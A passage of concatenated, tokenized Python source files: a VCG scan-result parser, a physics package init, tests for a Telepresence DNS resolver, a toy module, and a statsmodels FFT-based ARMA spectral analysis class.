<indent> data . title = '' <newline> <dedent> else : <newline> <indent> data . title = self . get_field_from_row ( row , title_column ) <newline> <dedent> if self . get_field_from_row ( row , priority_column ) is None : <newline> <indent> data . priority = 6 <newline> <dedent> else : <newline> <indent> data . priority = int ( float ( self . get_field_from_row ( row , priority_column ) ) ) <newline> <dedent> data . severity = self . get_field_from_row ( row , severity_column ) <newline> data . description = self . get_field_from_row ( row , description_column ) <newline> data . filename = self . get_field_from_row ( row , filename_column ) <newline> data . line = self . get_field_from_row ( row , line_column ) <newline> data . code_line = self . get_field_from_row ( row , code_line_column ) <newline> finding = data . to_finding ( test ) <newline> return finding <newline> <dedent> def parse ( self , content , test ) : <newline> <indent> dupes = dict ( ) <newline> reader = csv . reader ( StringIO . StringIO ( content ) , delimiter = ',' , quotechar = '"' ) <newline> for row in reader : <newline> <indent> finding = self . parse_issue ( row , test ) <newline> if finding is not None : <newline> <indent> key = hashlib . md5 ( finding . severity + '|' + finding . title + '|' + finding . description ) . hexdigest ( ) <newline> if key not in dupes : <newline> <indent> dupes [ key ] = finding <newline> <dedent> <dedent> <dedent> return dupes <newline> <dedent> def __init__ ( self ) : <newline> <indent> pass <newline> <dedent> <dedent> class VCGParser ( object ) : <newline> <indent> def __init__ ( self , filename , test ) : <newline> <indent> self . dupes = dict ( ) <newline> if filename is None : <newline> <indent> self . items = ( ) <newline> return <newline> <dedent> content = filename . read ( ) <newline> if filename . name . lower ( ) . endswith ( '.xml' ) : <newline> <indent> self . items = VCGXmlParser ( ) . parse ( content , test ) . values ( ) <newline> <dedent> elif filename . name . lower ( ) . endswith ( '.csv' ) : <newline> <indent> self . items = VCGCsvParser ( ) . parse ( content , test ) . values ( ) <newline> <dedent> else : <newline> <indent> raise Exception ( 'Unknown ▁ File ▁ Format' ) <newline> <dedent> <dedent> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  # ▁ Physics ▁ related ▁ modules ▁ <encdom> from . geometry import Point <newline> from . geometry import Line <newline> from . particles import Distribution <newline> from . orm import get_orm <newline> from . orm import get_orbit <newline> from . orm import inverse_matrix <newline> from . orm import get_correctors_settings <newline> __all__ = [ 'Point' , 'Line' , 'Distribution' , 'get_orm' , 'get_orbit' , 'inverse_matrix' , 'get_correctors_settings' ] <newline>
 """ <strnewline> Tests ▁ for ▁ ``resolver``, ▁ a ▁ forwarding ▁ DNS ▁ resolver ▁ which ▁ enables ▁ in-Pod-like <strnewline> name ▁ resolution ▁ for ▁ anyone ▁ who ▁ sends ▁ queries ▁ to ▁ it. <strnewline> """  <newline> from itertools import count <newline> from string import ascii_lowercase <newline> import pytest <newline> from twisted . names . dns import ( Record_A , RRHeader , Query , ) <newline> from resolver import ( LocalResolver , insort , ) <newline> from hypothesis import strategies as st , given <newline> @ pytest . fixture <newline> def resolver ( ) : <newline> <indent> return LocalResolver (  # ▁ Construct ▁ it ▁ with ▁ an ▁ invalid ▁ DNS ▁ server ▁ address ▁ (an ▁ IP ▁ is ▁ required, <encdom>  # ▁ no ▁ hostnames ▁ allowed). ▁ We're ▁ not ▁ interested ▁ in ▁ actually ▁ issuing ▁ DNS <encdom>  # ▁ queries ▁ to ▁ any ▁ servers ▁ during ▁ these ▁ tests. ▁ This ▁ will ▁ ensure ▁ that ▁ if <encdom>  # ▁ we ▁ attempt ▁ to ▁ do ▁ so, ▁ it ▁ will ▁ break ▁ quickly. <encdom> b"example.invalid" , u"default" , ) <newline> <dedent> def test_infer_search_domains ( resolver ) : <newline> <indent>  """ <strnewline> ▁ ``LocalResolver`` ▁ uses ▁ a ▁ number ▁ of ▁ DNS ▁ queries ▁ sent ▁ to ▁ it ▁ as ▁ probes ▁ to <strnewline> ▁ infer ▁ the ▁ search ▁ domains ▁ configured ▁ for ▁ the ▁ client. <strnewline> ▁ """  <newline> probe = u"hellotelepresence" <newline> counter = count ( 0 ) <newline> for search in [ u".foo" , u".foo.bar" , u".alternate" ] : <newline> <indent> for i in range ( 3 ) : <newline> <indent> name = u"{}{}{}" . format ( probe , next ( counter ) , search , ) . encode ( "ascii" ) <newline> rrheader = RRHeader ( name = name , payload = Record_A ( address = b"127.0.0.1" ) , ) <newline> expected = ( [ rrheader ] , [ ] , [ ] ) <newline> result = resolver . query ( Query ( name ) ) <newline> assert expected == result <newline> <dedent> <dedent> for search in [ u".foo" , u".foo.bar" , u".alternate" ] : <newline> <indent> mangled = ( u"example.com" + search ) . encode ( "ascii" ) . split ( b"." ) <newline> assert [ b"example" , b"com" ] == resolver . _strip_search_suffix ( mangled ) <newline> <dedent> <dedent> def labels ( ) : <newline> <indent>  """ <strnewline> ▁ Build ▁ random ▁ DNS ▁ labels. <strnewline> <strnewline> ▁ This ▁ can't ▁ build ▁ every ▁ possible ▁ DNS ▁ label. ▁ It ▁ just ▁ does ▁ enough ▁ to <strnewline> ▁ exercise ▁ the ▁ suffix ▁ detection ▁ logic ▁ (assuming ▁ that ▁ logic ▁ is ▁ independent ▁ of <strnewline> ▁ the ▁ particular ▁ bytes ▁ of ▁ the ▁ labels). <strnewline> ▁ """  <newline> return st . text ( alphabet = ascii_lowercase , min_size = 1 , ) <newline> <dedent> @ given ( labels ( ) , labels ( ) , labels ( ) ) <newline> def test_prefer_longest_suffix ( resolver , first , second , third ) : <newline> <indent>  """ <strnewline> ▁ If ▁ ``LocalResolver`` ▁ observes ▁ overlapping ▁ suffixes ▁ (for ▁ example, ▁"foo" ▁ and <strnewline> ▁"bar.foo") ▁ then ▁ it ▁ prefers ▁ to ▁ strip ▁ the ▁ longest ▁ one ▁ possible ▁ from ▁ any <strnewline> ▁ queries ▁ it ▁ forwards. <strnewline> ▁ """  <newline> probe = "hellotelepresence" <newline> target_suffix = "{}.{}" . format ( second , third ) <newline>  # ▁ Let ▁ it ▁ discover ▁ a ▁ few ▁ overlapping ▁ suffixes. <encdom> resolver . query ( Query ( "{}.{}" . format ( probe , third ) . encode ( "ascii" ) ) , ) <newline> resolver . query ( Query ( "{}.{}" . format ( probe , target_suffix ) . encode ( "ascii" ) ) , ) <newline> resolver . query ( Query ( "{}.{}.{}.{}" . format ( probe , first , second , third , ) . encode ( "ascii" ) ) , ) <newline>  # ▁ Ask ▁ it ▁ what ▁ base ▁ name ▁ it ▁ would ▁ forward ▁ if ▁ it ▁ received ▁ a ▁ query ▁ for ▁ a ▁ name <encdom>  # ▁ which ▁ has ▁ both ▁ suffixes. ▁ We ▁ would ▁ like ▁ it ▁ to ▁ strip ▁ the ▁ longest ▁ prefix <encdom>  # ▁ it ▁ can. <encdom> stripped = resolver . _strip_search_suffix ( "example.{}" . format ( target_suffix ) . encode ( "ascii" ) . split ( b"." ) , ) <newline> assert [ b"example" ] == stripped <newline> <dedent> @ given ( st . lists ( st . integers ( ) ) ) <newline> def test_insort ( values ) : <newline> <indent>  """ <strnewline> ▁ ``insort`` ▁ inserts ▁ a ▁ new ▁ element ▁ into ▁ a ▁ sorted ▁ list ▁ in ▁ the ▁ correct <strnewline> ▁ position ▁ to ▁ maintain ▁ the ▁ list's ▁ sorted ▁ property. <strnewline> ▁ """  <newline> insort_target = [ ] <newline> for v in values : <newline> <indent> insort ( insort_target , v , key = lambda v : - v ) <newline> <dedent> assert sorted ( values , reverse = True ) == insort_target <newline> <dedent>
xyzzy = 1 <newline> __all__ = [ 'xyzzy' ] <newline> def foo ( ) : <newline> <indent> shazam = 2 <newline> <dedent> class C : <newline> <indent> boohoo = 3 <newline> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  """ <strnewline> Created ▁ on ▁ Mon ▁ Dec ▁ 14 ▁ 19:53:25 ▁ 2009 <strnewline> <strnewline> Author: ▁ josef-pktd <strnewline> <strnewline> generate ▁ arma ▁ sample ▁ using ▁ fft ▁ with ▁ all ▁ the ▁ lfilter ▁ it ▁ looks ▁ slow <strnewline> to ▁ get ▁ the ▁ ma ▁ representation ▁ first <strnewline> <strnewline> apply ▁ arma ▁ filter ▁ (in ▁ ar ▁ representation) ▁ to ▁ time ▁ series ▁ to ▁ get ▁ white ▁ noise <strnewline> but ▁ seems ▁ slow ▁ to ▁ be ▁ useful ▁ for ▁ fast ▁ estimation ▁ for ▁ nobs=10000 <strnewline> <strnewline> change/check: ▁ instead ▁ of ▁ using ▁ marep, ▁ use ▁ fft-transform ▁ of ▁ ar ▁ and ▁ ma <strnewline> ▁ separately, ▁ use ▁ ratio ▁ check ▁ theory ▁ is ▁ correct ▁ and ▁ example ▁ works <strnewline> ▁ DONE ▁ : ▁ feels ▁ much ▁ faster ▁ than ▁ lfilter <strnewline> ▁ -> ▁ use ▁ for ▁ estimation ▁ of ▁ ARMA <strnewline> ▁ -> ▁ use ▁ pade ▁ (scipy.misc) ▁ approximation ▁ to ▁ get ▁ starting ▁ polynomial <strnewline> ▁ from ▁ autocorrelation ▁ (is ▁ autocorrelation ▁ of ▁ AR(p) ▁ related ▁ to ▁ marep?) <strnewline> ▁ check ▁ if ▁ pade ▁ is ▁ fast, ▁ not ▁ for ▁ larger ▁ arrays ▁ ? <strnewline> ▁ maybe ▁ pade ▁ doesn't ▁ do ▁ the ▁ right ▁ thing ▁ for ▁ this, ▁ not ▁ tried ▁ yet <strnewline> ▁ scipy.pade([ ▁ 1. ▁ , ▁ 0.6, ▁ 0.25, ▁ 0.125, ▁ 0.0625, ▁ 0.1],2) <strnewline> ▁ raises ▁ LinAlgError: ▁ singular ▁ matrix <strnewline> ▁ also ▁ doesn't ▁ have ▁ roots ▁ inside ▁ unit ▁ circle ▁ ?? <strnewline> ▁ -> ▁ even ▁ without ▁ initialization, ▁ it ▁ might ▁ be ▁ fast ▁ for ▁ estimation <strnewline> ▁ -> ▁ how ▁ do ▁ I ▁ enforce ▁ stationarity ▁ and ▁ invertibility, <strnewline> ▁ need ▁ helper ▁ function <strnewline> <strnewline> get ▁ function ▁ drop ▁ imag ▁ if ▁ close ▁ to ▁ zero ▁ from ▁ numpy/scipy ▁ source, ▁ where? <strnewline> <strnewline> """  <newline> from __future__ import print_function <newline> import numpy as np <newline> import numpy . fft as fft <newline>  # import ▁ scipy.fftpack ▁ as ▁ fft <encdom> from scipy import signal <newline>  # from ▁ try_var_convolve ▁ import ▁ maxabs <encdom> from statsmodels . sandbox . archive . linalg_decomp_1 import OneTimeProperty <newline> from statsmodels . tsa . arima_process import ArmaProcess <newline>  # trying ▁ to ▁ convert ▁ old ▁ experiments ▁ to ▁ a ▁ class <encdom> class ArmaFft ( ArmaProcess ) : <newline> <indent>  ''' fft ▁ tools ▁ for ▁ arma ▁ processes <strnewline> <strnewline> ▁ This ▁ class ▁ contains ▁ several ▁ methods ▁ that ▁ are ▁ providing ▁ the ▁ same ▁ or ▁ similar <strnewline> ▁ returns ▁ to ▁ try ▁ out ▁ and ▁ test ▁ different ▁ implementations. <strnewline> <strnewline> ▁ Notes <strnewline> ▁ ----- <strnewline> ▁ TODO: <strnewline> ▁ check ▁ whether ▁ we ▁ don't ▁ want ▁ to ▁ fix ▁ maxlags, ▁ and ▁ create ▁ new ▁ instance ▁ if <strnewline> ▁ maxlag ▁ changes. ▁ usage ▁ for ▁ different ▁ lengths ▁ of ▁ timeseries ▁ ? <strnewline> ▁ or ▁ fix ▁ frequency ▁ and ▁ length ▁ for ▁ fft <strnewline> <strnewline> ▁ check ▁ default ▁ frequencies ▁ w, ▁ terminology ▁ norw ▁ n_or_w <strnewline> <strnewline> ▁ some ▁ ffts ▁ are ▁ currently ▁ done ▁ without ▁ padding ▁ with ▁ zeros <strnewline> <strnewline> ▁ returns ▁ for ▁ spectral ▁ density ▁ methods ▁ needs ▁ checking, ▁ is ▁ it ▁ always ▁ the ▁ power <strnewline> ▁ spectrum ▁ hw*hw.conj() <strnewline> <strnewline> ▁ normalization ▁ of ▁ the ▁ power ▁ spectrum, ▁ spectral ▁ density: ▁ not ▁ checked ▁ yet, ▁ for <strnewline> ▁ example ▁ no ▁ variance ▁ of ▁ underlying ▁ process ▁ is ▁ used <strnewline> <strnewline> ▁ '''  <newline> def __init__ ( self , ar , ma , n ) : <newline>  # duplicates ▁ now ▁ that ▁ are ▁ subclassing ▁ ArmaProcess <encdom> <indent> super ( ArmaFft , self ) . __init__ ( ar , ma ) <newline> self . ar = np . asarray ( ar ) <newline> self . ma = np . asarray ( ma ) <newline> self . nobs = n <newline>  # could ▁ make ▁ the ▁ polynomials ▁ into ▁ cached ▁ attributes <encdom> self . arpoly = np . polynomial . Polynomial ( ar ) <newline> self . mapoly = np . polynomial . Polynomial ( ma ) <newline> self . nar = len ( ar )  # 1d ▁ only ▁ currently <encdom> <newline> self . nma = len ( ma ) <newline> <dedent> def padarr ( self , arr , maxlag , atend = True ) : <newline> <indent>  ''' pad ▁ 1d ▁ array ▁ with ▁ zeros ▁ at ▁ end ▁ to ▁ have ▁ length ▁ maxlag <strnewline> ▁ function ▁ that ▁ is ▁ a ▁ method, ▁ no ▁ self ▁ used <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ arr ▁ : ▁ array_like, ▁ 1d <strnewline> ▁ array ▁ that ▁ will ▁ be ▁ padded ▁ with ▁ zeros <strnewline> ▁ maxlag ▁ : ▁ int <strnewline> ▁ length ▁ of ▁ array ▁ after ▁ padding <strnewline> ▁ atend ▁ : ▁ boolean <strnewline> ▁ If ▁ True ▁ (default), ▁ then ▁ the ▁ zeros ▁ are ▁ added ▁ to ▁ the ▁ end, ▁ otherwise <strnewline> ▁ to ▁ the ▁ front ▁ of ▁ the ▁ array <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ arrp ▁ : ▁ ndarray <strnewline> ▁ zero-padded ▁ array <strnewline> <strnewline> ▁ Notes <strnewline> ▁ ----- <strnewline> ▁ This ▁ is ▁ mainly ▁ written ▁ to ▁ extend ▁ coefficient ▁ arrays ▁ for ▁ the ▁ lag-polynomials. <strnewline> ▁ It ▁ returns ▁ a ▁ copy. <strnewline> <strnewline> ▁ '''  <newline> if atend : <newline> <indent> return np . r_ [ arr , np . zeros ( maxlag - len ( arr ) ) ] <newline> <dedent> else : <newline> <indent> return np . r_ [ np . zeros ( maxlag - len ( arr ) ) , arr ] <newline> <dedent> <dedent> def pad ( self , maxlag ) : <newline> <indent>  ''' construct ▁ AR ▁ and ▁ MA ▁ polynomials ▁ that ▁ are ▁ zero-padded ▁ to ▁ a ▁ common ▁ length <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ maxlag ▁ : ▁ int <strnewline> ▁ new ▁ length ▁ of ▁ lag-polynomials <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ ar ▁ : ▁ ndarray <strnewline> ▁ extended ▁ AR ▁ polynomial ▁ coefficients <strnewline> ▁ ma ▁ : ▁ ndarray <strnewline> ▁ extended ▁ AR ▁ polynomial ▁ coefficients <strnewline> <strnewline> ▁ '''  <newline> arpad = np . r_ [ self . ar , np . zeros ( maxlag - self . nar ) ] <newline> mapad = np . r_ [ self . ma , np . zeros ( maxlag - self . nma ) ] <newline> return arpad , mapad <newline> <dedent> def fftar ( self , n = None ) : <newline> <indent>  ''' Fourier ▁ transform ▁ of ▁ AR ▁ polynomial, ▁ zero-padded ▁ at ▁ end ▁ to ▁ n <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ n ▁ : ▁ int <strnewline> ▁ length ▁ of ▁ array ▁ after ▁ zero-padding <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ fftar ▁ : ▁ ndarray <strnewline> ▁ fft ▁ of ▁ zero-padded ▁ ar ▁ polynomial <strnewline> ▁ '''  <newline> if n is None : <newline> <indent> n = len ( self . ar ) <newline> <dedent> return fft . fft ( self . padarr ( self . ar , n ) ) <newline> <dedent> def fftma ( self , n ) : <newline> <indent>  ''' Fourier ▁ transform ▁ of ▁ MA ▁ polynomial, ▁ zero-padded ▁ at ▁ end ▁ to ▁ n <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ n ▁ : ▁ int <strnewline> ▁ length ▁ of ▁ array ▁ after ▁ zero-padding <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ fftar ▁ : ▁ ndarray <strnewline> ▁ fft ▁ of ▁ zero-padded ▁ ar ▁ polynomial <strnewline> ▁ '''  <newline> if n is None : <newline> <indent> n = len ( self . ar ) <newline> <dedent> return fft . fft ( self . padarr ( self . ma , n ) ) <newline>  # @OneTimeProperty ▁ # ▁ not ▁ while ▁ still ▁ debugging ▁ things <encdom> <dedent> def fftarma ( self , n = None ) : <newline> <indent>  ''' Fourier ▁ transform ▁ of ▁ ARMA ▁ polynomial, ▁ zero-padded ▁ at ▁ end ▁ to ▁ n <strnewline> <strnewline> ▁ The ▁ Fourier ▁ transform ▁ of ▁ the ▁ ARMA ▁ process ▁ is ▁ calculated ▁ as ▁ the ▁ ratio <strnewline> ▁ of ▁ the ▁ fft ▁ of ▁ the ▁ MA ▁ polynomial ▁ divided ▁ by ▁ the ▁ fft ▁ of ▁ the ▁ AR ▁ polynomial. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ n ▁ : ▁ int <strnewline> ▁ length ▁ of ▁ array ▁ after ▁ zero-padding <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ fftarma ▁ : ▁ ndarray <strnewline> ▁ fft ▁ of ▁ zero-padded ▁ arma ▁ polynomial <strnewline> ▁ '''  <newline> if n is None : <newline> <indent> n = self . nobs <newline> <dedent> return ( self . fftma ( n ) / self . fftar ( n ) ) <newline> <dedent> def spd ( self , npos ) : <newline> <indent>  ''' raw ▁ spectral ▁ density, ▁ returns ▁ Fourier ▁ transform <strnewline> <strnewline> ▁ n ▁ is ▁ number ▁ of ▁ points ▁ in ▁ positive ▁ spectrum, ▁ the ▁ actual ▁ number ▁ of ▁ points <strnewline> ▁ is ▁ twice ▁ as ▁ large. ▁ different ▁ from ▁ other ▁ spd ▁ methods ▁ with ▁ fft <strnewline> ▁ '''  <newline> n = npos <newline> w = fft . fftfreq ( 2 * n ) * 2 * np . pi <newline> hw = self . fftarma ( 2 * n )  # not ▁ sure, ▁ need ▁ to ▁ check ▁ normalization <encdom> <newline>  # return ▁ (hw*hw.conj()).real[n//2-1:] ▁ * ▁ 0.5 ▁ / ▁ np.pi ▁ # doesn't ▁ show ▁ in ▁ plot <encdom> return ( hw * hw . conj ( ) ) . real * 0.5 / np . pi , w <newline> <dedent> def spdshift ( self , n ) : <newline> <indent>  ''' power ▁ spectral ▁ density ▁ using ▁ fftshift <strnewline> <strnewline> ▁ currently ▁ returns ▁ two-sided ▁ according ▁ to ▁ fft ▁ frequencies, ▁ use ▁ first ▁ half <strnewline> ▁ '''  <newline>  # size ▁ = ▁ s1+s2-1 <encdom> mapadded = self . padarr ( self . ma , n ) <newline> arpadded = self . padarr ( self . ar , n ) <newline> hw = fft . fft ( fft . fftshift ( mapadded ) ) / fft . fft ( fft . fftshift ( arpadded ) ) <newline>  # return ▁ np.abs(spd)[n//2-1:] <encdom> w = fft . fftfreq ( n ) * 2 * np . pi <newline> wslice = slice ( n // 2 - 1 , None , None ) <newline>  # return ▁ (hw*hw.conj()).real[wslice], ▁ w[wslice] <encdom> return ( hw * hw . conj ( ) ) . real , w <newline> <dedent> def spddirect ( self , n ) : <newline> <indent>  ''' power ▁ spectral ▁ density ▁ using ▁ padding ▁ to ▁ length ▁ n ▁ done ▁ by ▁ fft <strnewline> <strnewline> ▁ currently ▁ returns ▁ two-sided ▁ according ▁ to ▁ fft ▁ frequencies, ▁ use ▁ first ▁ half <strnewline> ▁ '''  <newline>  # size ▁ = ▁ s1+s2-1 <encdom>  # abs ▁ looks ▁ wrong <encdom> hw = fft . fft ( self . ma , n ) / fft . fft ( self . ar , n ) <newline> w = fft . fftfreq ( n ) * 2 * np . pi <newline> wslice = slice ( None , n // 2 , None ) <newline>  # return ▁ (np.abs(hw)**2)[wslice], ▁ w[wslice] <encdom> return ( np . abs ( hw ) ** 2 ) * 0.5 / np . pi , w <newline> <dedent> def _spddirect2 ( self , n ) : <newline> <indent>  ''' this ▁ looks ▁ bad, ▁ maybe ▁ with ▁ an ▁ fftshift <strnewline> ▁ '''  <newline>  # size ▁ = ▁ s1+s2-1 <encdom> hw = ( fft . fft ( np . r_ [ self . ma [ : : - 1 ] , self . ma ] , n ) / fft . fft ( np . r_ [ self . ar [ : : - 1 ] , self . ar ] , n ) ) <newline> return ( hw * hw . conj ( ) )  # .real[n//2-1:] <encdom> <newline> <dedent> def spdroots ( self , w ) : <newline> <indent>  ''' spectral ▁ density ▁ for ▁ frequency ▁ using ▁ polynomial ▁ roots <strnewline> <strnewline> ▁ builds ▁ two ▁ arrays ▁ (number ▁ of ▁ roots, ▁ number ▁ of ▁ frequencies) <strnewline> ▁ '''  <newline> return self . spdroots_ ( self . arroots , self . maroots , w ) <newline> <dedent> def spdroots_ ( self , arroots , maroots , w ) : <newline> <indent>  ''' spectral ▁ density ▁ for ▁ frequency ▁ using ▁ polynomial ▁ roots <strnewline> <strnewline> ▁ builds ▁ two ▁ arrays ▁ (number ▁ of ▁ roots, ▁ number ▁ of ▁ frequencies) <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ arroots ▁ : ▁ ndarray <strnewline> ▁ roots ▁ of ▁ ar ▁ (denominator) ▁ lag-polynomial <strnewline> ▁ maroots ▁ : ▁ ndarray <strnewline> ▁ roots ▁ of ▁ ma ▁ (numerator) ▁ lag-polynomial <strnewline> ▁ w ▁ : ▁ array_like <strnewline> ▁ frequencies ▁ for ▁ which ▁ spd ▁ is ▁ calculated <strnewline> <strnewline> ▁ Notes <strnewline> ▁ ----- <strnewline> ▁ this ▁ should ▁ go ▁ into ▁ a ▁ function <strnewline> ▁ '''  <newline> w = np . atleast_2d ( w ) . T <newline> cosw = np . cos ( w ) <newline>  # Greene ▁ 5th ▁ edt. ▁ p626, ▁ section ▁ 20.2.7.a. <encdom> maroots = 1. / maroots <newline> arroots = 1. / arroots <newline> num = 1 + maroots ** 2 - 2 * maroots * cosw <newline> den = 1 + arroots ** 2 - 2 * arroots * cosw <newline>  # print ▁'num.shape, ▁ den.shape', ▁ num.shape, ▁ den.shape <encdom> hw = 0.5 / np . pi * num . prod ( - 1 ) / den . prod ( - 1 )  # or ▁ use ▁ expsumlog <encdom> <newline> return np . squeeze ( hw ) , w . squeeze ( ) <newline> <dedent> def spdpoly ( self , w , nma = 50 ) : <newline> <indent>  ''' spectral ▁ density ▁ from ▁ MA ▁ polynomial ▁ representation ▁ for ▁ ARMA ▁ process <strnewline> <strnewline> ▁ References <strnewline> ▁ ----- <strnewline> ▁ Cochrane, ▁ section ▁ 8.3.3 <strnewline> ▁ '''  <newline> mpoly = np . polynomial . Polynomial ( self . arma2ma ( nma ) ) <newline> hw = mpoly ( np . exp ( 1j * w ) ) <newline> spd = np . real_if_close ( hw * hw . conj ( ) * 0.5 / np . pi ) <newline> return spd , w <newline> <dedent> def filter ( self , x ) : <newline> <indent>  ''' <strnewline> ▁ filter ▁ a ▁ timeseries ▁ with ▁ the ▁ ARMA ▁ filter <strnewline> <strnewline> ▁ padding ▁ with ▁ zero ▁ is ▁ missing, ▁ in ▁ example ▁ I ▁ needed ▁ the ▁ padding ▁ to ▁ get <strnewline> ▁ initial ▁ conditions ▁ identical ▁ to ▁ direct ▁ filter <strnewline> <strnewline> ▁ Initial ▁ filtered ▁ observations ▁ differ ▁ from ▁ filter2 ▁ and ▁ signal.lfilter, ▁ but <strnewline> ▁ at ▁ end ▁ they ▁ are ▁ the ▁ same. <strnewline> <strnewline> ▁ See ▁ Also <strnewline> ▁ ----- <strnewline> ▁ tsa.filters.fftconvolve <strnewline> <strnewline> ▁ '''  <newline> n = x . shape [ 0 ] <newline> if n == self . fftarma : <newline> <indent> fftarma = self . fftarma <newline> <dedent> else : <newline> <indent> fftarma = self . fftma ( n ) / self . fftar ( n ) <newline> <dedent> tmpfft = fftarma * fft . fft ( x ) <newline> return fft . ifft ( tmpfft ) <newline> <dedent> def filter2 ( self , x , pad = 0 ) : <newline> <indent>  ''' filter ▁ a ▁ time ▁ series ▁ using ▁ fftconvolve3 ▁ with ▁ ARMA ▁ filter <strnewline> <strnewline> ▁ padding ▁ of ▁ x ▁ currently ▁ works ▁ only ▁ if ▁ x ▁ is ▁ 1d <strnewline> ▁ in ▁ example ▁ it ▁ produces ▁ same ▁ observations ▁ at ▁ beginning ▁ as ▁ lfilter ▁ even <strnewline> ▁ without ▁ padding. <strnewline> <strnewline> ▁ TODO: ▁ this ▁ returns ▁ 1 ▁ additional ▁ observation ▁ at ▁ the ▁ end <strnewline> ▁ '''  <newline> from statsmodels . tsa . filters import fftconvolve3 <newline> if not pad : <newline> <indent> pass <newline> <dedent> elif pad == 'auto' : <newline>  # just ▁ guessing ▁ how ▁ much ▁ padding <encdom> <indent> x = self . padarr ( x , x . shape [ 0 ] + 2 * ( self . nma + self . nar ) , atend = False ) <newline> <dedent> else : <newline> <indent> x = self . padarr ( x , x . shape [ 0 ] + int ( pad ) , atend = False ) <newline> <dedent> return fftconvolve3 ( x , self . ma , self . ar ) <newline> <dedent> def acf2spdfreq ( self , acovf , nfreq = 100 , w = None ) : <newline> <indent>  ''' <strnewline> ▁ not ▁ really ▁ a ▁ method <strnewline> ▁ just ▁ for ▁ comparison, ▁ not ▁ efficient ▁ for ▁ large ▁ n ▁ or ▁ long ▁ acf <strnewline> <strnewline> ▁ this ▁ is ▁ also ▁ similarly ▁ use ▁ in ▁ tsa.stattools.periodogram ▁ with ▁ window <strnewline> ▁ '''  <newline> if w is None : <newline> <indent> w = np . linspace ( 0 , np . pi , nfreq ) [ : , None ] <newline> <dedent> nac = len ( acovf ) <newline> hw = 0.5 / np . pi * ( acovf [ 0 ] + 2 * ( acovf [ 1 : ] * np . cos ( w * np . arange ( 1 , nac ) ) ) . sum ( 1 ) ) <newline> return hw <newline> <dedent> def invpowerspd ( self , n ) : <newline> <indent>  ''' autocovariance ▁ from ▁ spectral ▁ density <strnewline> <strnewline> ▁ scaling ▁ is ▁ correct, ▁ but ▁ n ▁ needs ▁ to ▁ be ▁ large ▁ for ▁ numerical ▁ accuracy <strnewline> ▁ maybe ▁ padding ▁ with ▁ zero ▁ in ▁ fft ▁ would ▁ be ▁ faster <strnewline> ▁ without ▁ slicing ▁ it ▁ returns ▁ 2-sided ▁ autocovariance ▁ with ▁ fftshift <strnewline> <strnewline> ▁ >>> ▁ ArmaFft([1, ▁ -0.5], ▁ [1., ▁ 0.4], ▁ 40).invpowerspd(2**8)[:10] <strnewline> ▁ array([ ▁ 2.08 ▁ , ▁ 1.44 ▁ , ▁ 0.72 ▁ , ▁ 0.36 ▁ , ▁ 0.18 ▁ , ▁ 0.09 ▁ , <strnewline> ▁ 0.045 ▁ , ▁ 0.0225 ▁ , ▁ 0.01125 ▁ , ▁ 0.005625]) <strnewline> ▁ >>> ▁ ArmaFft([1, ▁ -0.5], ▁ [1., ▁ 0.4], ▁ 40).acovf(10) <strnewline> ▁ array([ ▁ 2.08 ▁ , ▁ 1.44 ▁ , ▁ 0.72 ▁ , ▁ 0.36 ▁ , ▁ 0.18 ▁ , ▁ 0.09 ▁ , <strnewline> ▁ 0.045 ▁ , ▁ 0.0225 ▁ , ▁ 0.01125 ▁ , ▁ 0.005625]) <strnewline> ▁ '''  <newline> hw = self . fftarma ( n ) <newline> return np . real_if_close ( fft . ifft ( hw * hw . conj ( ) ) , tol = 200 ) [ : n ] <newline> <dedent> def spdmapoly ( self , w , twosided = False ) : <newline> <indent>  ''' ma ▁ only, ▁ need ▁ division ▁ for ▁ ar, ▁ use ▁ LagPolynomial <strnewline> ▁ '''  <newline> if w is None : <newline> <indent> w = np . linspace ( 0 , np . pi , nfreq ) <newline> <dedent> return 0.5 / np . pi * self . mapoly ( np . exp ( w * 1j ) ) <newline> <dedent> def plot4 ( self , fig = None , nobs = 100 , nacf = 20 , nfreq = 100 ) : <newline> <indent> rvs = self . generate_sample ( nsample = 100 , burnin = 500 ) <newline> acf = self . acf ( nacf ) [ : nacf ]  # TODO: ▁ check ▁ return ▁ length <encdom> <newline> pacf = self . pacf ( nacf ) <newline> w = np . linspace ( 0 , np . pi , nfreq ) <newline> spdr , wr = self . spdroots ( w ) <newline> if fig is None : <newline> <indent> import matplotlib . pyplot as plt <newline> fig = plt . figure ( ) <newline> <dedent> ax = fig . add_subplot ( 2 , 2 , 1 ) <newline> ax . plot ( rvs ) <newline> ax . set_title ( 'Random ▁ Sample ▁ \n ar=%s, ▁ ma=%s' % ( self . ar , self . ma ) ) <newline> ax = fig . add_subplot ( 2 , 2 , 2 ) <newline> ax . plot ( acf ) <newline> ax . set_title ( 'Autocorrelation ▁ \n ar=%s, ▁ ma=%rs' % ( self . ar , self . ma ) ) <newline> ax = fig . add_subplot ( 2 , 2 , 3 ) <newline> ax . plot ( wr , spdr ) <newline> ax . set_title ( 'Power ▁ Spectrum ▁ \n ar=%s, ▁ ma=%s' % ( self . ar , self . ma ) ) <newline> ax = fig . add_subplot ( 2 , 2 , 4 ) <newline> ax . plot ( pacf ) <newline> ax . set_title ( 'Partial ▁ Autocorrelation ▁ \n ar=%s, ▁ ma=%s' % ( self . ar , self . ma ) ) <newline> return fig <newline> <dedent> <dedent> def spdar1 ( ar , w ) : <newline> <indent> if np . ndim ( ar ) == 0 : <newline> <indent> rho = ar <newline> <dedent> else : <newline> <indent> rho = - ar [ 1 ] <newline> <dedent> return 0.5 / np . pi / ( 1 + rho * rho - 2 * rho * np . cos ( w ) ) <newline> <dedent> if __name__ == 